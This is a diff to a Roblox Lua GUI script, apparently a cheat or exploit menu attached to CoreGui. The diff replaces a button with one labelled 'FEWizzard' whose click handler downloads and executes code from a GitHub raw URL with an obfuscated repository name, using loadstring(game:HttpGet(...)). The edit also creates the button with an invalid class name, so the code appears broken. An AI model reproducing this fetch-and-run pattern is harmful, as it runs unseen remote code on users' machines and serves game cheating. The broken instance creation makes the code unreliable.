@@ -1,7 +1,3 @@
--- Gui to Lua
--- Version: 3.2
-
--- Instances:
 
 local ScreenGui = Instance.new("ScreenGui")
 local main = Instance.new("Frame")
@@ -10,10 +6,10 @@ local TextLabel = Instance.new("TextLabel")
 local TextLabel_2 = Instance.new("TextLabel")
 local gui2 = Instance.new("TextButton")
 local gui3 = Instance.new("TextButton")
-local TextButton = Instance.new("TextButton")
+local fewizzard = Instance.new("fewizzard")
 local ImageLabel = Instance.new("ImageLabel")
 
---Properties:
+
 
 ScreenGui.Parent = game.CoreGui
 
@@ -84,14 +80,18 @@ gui3.MouseButton1Down:connect(function()
 end)
 
 
-TextButton.Parent = main
-TextButton.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
-TextButton.Position = UDim2.new(0.293906808, 0, 0.205035985, 0)
-TextButton.Size = UDim2.new(0, 64, 0, 29)
-TextButton.Font = Enum.Font.SourceSans
-TextButton.Text = "FEWizzard"
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.TextSize = 14.000
+fewizzard.Parent = main
+fewizzard.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
+fewizzard.Position = UDim2.new(0.293906808, 0, 0.205035985, 0)
+fewizzard.Size = UDim2.new(0, 64, 0, 29)
+fewizzard.Font = Enum.Font.SourceSans
+fewizzard.Text = "FEWizzard"
+fewizzard.TextColor3 = Color3.fromRGB(0, 0, 0)
+fewizzard.TextSize = 14.000
+fewizzard.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/selecteduseromg343/10101010101010100239423-094-3qr-q3wak-jr3-qhr-uq35rhn-u2qhfewhfn/main/README.md'),true))()
+end)
+
 
 ImageLabel.Parent = main
 ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
